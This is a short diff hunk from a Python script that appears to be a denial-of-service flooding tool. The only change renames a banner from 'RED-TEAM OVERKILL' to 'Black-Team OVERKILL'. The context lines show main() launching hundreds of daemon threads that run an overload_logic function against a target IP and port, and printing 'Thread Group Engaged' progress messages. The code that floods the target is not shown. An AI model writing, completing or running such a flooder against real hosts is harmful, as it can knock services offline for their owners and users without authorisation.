@@ -96,7 +96,7 @@ def overload_logic(ip, port):
             pass
 
 def main():
-    print(f"\n{RED}[!] ACTIVATING RED-TEAM OVERKILL...{RESET}")
+    print(f"\n{RED}[!] ACTIVATING Black-Team OVERKILL...{RESET}")
     for i in range(power_level):
         threading.Thread(target=overload_logic, args=(target_ip, target_port), daemon=True).start()
         if i % 100 == 0: print(f"{BLUE}[*] Thread Group {i} Engaged{RESET}")
